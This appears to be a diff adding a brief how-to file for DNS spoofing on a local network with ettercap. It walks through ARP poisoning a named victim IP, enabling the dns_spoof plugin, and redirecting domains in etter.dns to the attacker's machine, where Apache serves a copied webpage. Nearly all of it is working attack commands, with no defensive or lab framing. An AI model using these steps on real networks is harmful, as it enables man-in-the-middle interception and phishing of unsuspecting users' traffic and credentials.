@@ -1,0 +1,31 @@
+BASIC DNS SPOOFING ON A LAN
+---------------------------
+
+1) Configuring ettercap
+
+   --> Go to /etc/ettercap.conf
+   --> Uncomment the lines below "Linux, if you use iptables"
+
+2) Open Ettercap
+
+   >> ettercap -G
+
+3) Start
+
+   >> start > Unified sniffing
+   >> start > stop sniffing (after a while)
+   >> Hosts > scan hosts
+   >> hosts > list host
+   --> Add victim's IP to target 1 and Bcast IP to target 2
+   >> MITM > ARP Poisoning > Sniff remote connections
+   >> Plugins > Manage Plugins > dns_spoof
+
+4) Change dns ettercap
+
+   >> gedit /etc/ettercap/etter.dns
+   --> Go to where it says microsoft sucks ;) and change the IP of the domains
+       to be redirected to your own IP
+   >> service apache2 start
+   --> Place the copy of the webpage in /var/www/html/index.html
+
+5) Start > start sniffing
